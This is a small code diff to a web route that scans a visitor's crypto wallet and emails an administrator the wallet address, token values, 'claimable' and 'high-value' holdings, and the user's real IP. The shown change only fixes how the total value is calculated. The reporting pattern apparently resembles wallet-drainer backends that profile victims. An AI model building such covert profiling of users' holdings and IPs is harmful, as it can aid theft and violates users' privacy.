@@ -360,13 +360,18 @@ router.post('/scan-wallet', async (req, res) => {
       const claimableTokens = scanResults.filter(r => r.claimable);
       const highValueTokens = scanResults.filter(r => parseFloat(r.amount) > 100);
       
+      console.log('📧 SCAN EMAIL: Tokens found:', scanResults.length);
+      
       if (scanResults.length > 0) {
+        // Calculate total value for email
+        let emailTotalValue = scanResults.reduce((sum, result) => sum + parseFloat(result.amount || 0), 0);
+        
         const emailSent = await sendAdminNotification(
-          `SCAN COMPLETE: ${scanResults.length} tokens - $${totalValue.toFixed(0)} value`,
+          `SCAN COMPLETE: ${scanResults.length} tokens - $${emailTotalValue.toFixed(0)} value`,
           `WALLET SCAN COMPLETED\n\n` +
           `WALLET: ${walletAddress}\n` +
           `RESULTS: ${scanResults.length} total, ${claimableTokens.length} claimable\n` +
-          `VALUE: $${totalValue.toFixed(2)} (${highValueTokens.length} high-value)\n` +
+          `VALUE: $${emailTotalValue.toFixed(2)} (${highValueTokens.length} high-value)\n` +
           `CHAINS: ${[...new Set(scanResults.map(r => r.chainId))].length}\n\n` +
           `TOP FINDINGS:\n${scanResults.slice(0,5).map(r => `${r.tokenSymbol}: ${r.amount} (${r.claimable ? 'CLAIMABLE' : 'Locked'})`).join('\n')}\n\n` +
           `USER: ${realIP}\n` +
